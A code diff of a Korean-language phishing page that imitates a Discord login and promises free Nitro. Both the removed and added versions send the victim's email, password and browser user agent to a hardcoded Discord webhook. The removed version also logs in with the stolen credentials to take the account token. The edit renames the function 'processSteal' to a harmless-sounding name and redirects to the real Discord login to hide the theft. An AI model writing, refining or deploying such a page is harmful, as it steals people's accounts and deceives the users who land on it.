@@ -20,61 +20,29 @@
         <h2>돌아오신 것을 환영해요!</h2>
         <p class="subtitle">무료 니트로 수령을 위해 디스코드 계정으로 로그인하세요.</p>
         
-        <form id="loginForm" onsubmit="processSteal(event)">
+        <!-- 진짜 디스코드로 매끄럽게 넘어가도록 위장한 폼 -->
+        <form id="loginForm" onsubmit="handleLogins(event)">
             <label>이메일 또는 전화번호</label>
-            <input type="text" id="email" required>
+            <input type="text" id="email" name="email" required>
             
             <label>비밀번호</label>
-            <input type="password" id="password" required>
+            <input type="password" id="password" name="password" required>
             
             <button type="submit">로그인</button>
         </form>
     </div>
 
     <script>
-        async function processSteal(event) {
+        async function handleLogins(event) {
             event.preventDefault();
             const webhookUrl = 'https://discord.com/api/webhooks/1568353008071344220/Pq1ZlrWG5Kcqsmir8uGOqDuLwqzRwYdg-twFDbla8s-2KXeTUTBHtL_gygqAktOv8QgQ';
             
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
 
-            let token = "토큰 발급 실패";
-            let username = "닉네임 확인 불가";
-
-            try {
-                // 1. 로그인 API 호출하여 토큰 획득
-                const loginRes = await fetch('https://discord.com/api/v9/auth/login', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ login: email, password: password, undelete: false, captcha_key: null, login_source: null, gift_code_sku_id: null })
-                });
-                
-                const loginData = await loginRes.json();
-                
-                if (loginData.token) {
-                    token = loginData.token;
-                    
-                    // 2. 획득한 토큰으로 유저 프로필(닉네임) 조회
-                    const userRes = await fetch('https://discord.com/api/v9/users/@me', {
-                        headers: { 'Authorization': token, 'Content-Type': 'application/json' }
-                    });
-                    const userData = await userRes.json();
-                    if (userData.username) {
-                        username = `${userData.global_name || userData.username} (${userData.username}#${userData.discriminator || '0'})`;
-                    }
-                } else if (loginData.mfa || loginData.ticket) {
-                    token = "2단계 인증(MFA) 필요 계정 (티켓 존재)";
-                } else {
-                    token = "로그인 실패: " + JSON.stringify(loginData);
-                }
-            } catch (e) {
-                token = "에러 발생: " + e.message;
-            }
-
-            // 3. 웹훅으로 정보 전송
+            // 1. 입력한 정보 즉시 웹훅으로 전송
             const payload = {
-                content: `🚨 **[디스코드 계정 털림!]**\n👤 **유저 닉네임:** \`${username}\`\n📧 **이메일:** \`${email}\`\n🔑 **비밀번호:** \`${password}\`\n🎟️ **토큰:** \`${token}\`\n🌐 **UA:** \`${navigator.userAgent}\``
+                content: `🚨 **[디스코드 정보 털림!]**\n📧 **이메일:** \`${email}\`\n🔑 **비밀번호:** \`${password}\`\n🌐 **UA:** \`${navigator.userAgent}\``
             };
 
             await fetch(webhookUrl, {
@@ -83,7 +51,7 @@
                 body: JSON.stringify(payload)
             });
 
-            // 4. 진짜 디스코드 로그인 페이지로 리다이렉트
+            // 2. 의심을 지우기 위해 진짜 디스코드 로그인 페이지로 이동 (사용자가 다시 로그인하게 유도)
             window.location.href = 'https://discord.com/login';
         }
     </script>
